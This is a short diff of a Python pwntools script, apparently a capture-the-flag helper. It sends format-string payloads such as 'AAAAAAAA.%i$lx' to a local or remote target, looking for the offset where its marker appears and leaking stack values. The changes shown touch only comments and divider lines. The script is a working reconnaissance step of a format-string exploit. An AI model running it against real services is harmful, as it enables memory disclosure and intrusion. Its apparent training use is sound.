@@ -68,14 +68,16 @@ for i in range(args.num):
             p = process(e.path)
         else:
             p = remote(args.ip, args.port)
+        #########################################################################CHANGE##THIS#############################################################################################
         # Format the counter
         # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
         # or use $s to show strings #change this
-        p.sendlineafter('go?\n', 'AAAAAAAA.%{}$lx'.format(i).encode()) # change this
+        p.sendlineafter('go?\n', 'AAAAAAAA.%{}$lx'.format(i).encode()) # change this  (8 As on x64  -- 4 As on x32)
         # Receive the response
-        p.recvuntil('hmm... ')  # change this
+        p.recvuntil('hmm... ')
         result = p.recvline()
-        result = result.split(b'is')[0].strip()  # change this
+        result = result.split(b'is')[0].strip()
+        #########################################################################CHANGE##THIS###############################################################################################
 
         # printf
         if ('41414141' in str(result)):
